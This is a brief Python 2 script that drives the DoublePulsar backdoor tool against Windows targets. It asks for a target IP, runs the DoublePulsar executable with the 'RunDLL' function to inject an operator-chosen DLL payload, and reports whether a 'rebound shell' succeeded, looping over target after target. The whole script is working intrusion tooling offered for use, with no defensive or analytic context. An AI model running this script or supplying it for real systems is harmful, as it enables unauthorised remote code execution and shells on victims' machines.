# -*- coding: utf-8 -*-

import sys,os
path = str(os.getcwd())
def testconnect(dll):
    ip = raw_input("Please input IP: ")
    if ip == "dll":
        dll = raw_input("DLLload:")
    else:
        path = str(os.getcwd())
        fp = os.popen(path + "\\windows\\Doublepulsar-1.3.1.exe --InConfig " + path + "\\windows\\Doublepulsar-1.3.1.xml" + " --TargetIp " + str(ip) + " --Function RunDLL --DllPayload " + path + "\\dll\\" + dll + ".dll")
        s = fp.read()
        if 'configversion="1.3.1.0" name="Doublepulsar"' in s:
            print "Rebound Shell successful!"
        else:
            print "Bounce shell failed!!!"
    return dll

dll = raw_input("DLLload:")
while True:
    dll = testconnect(dll)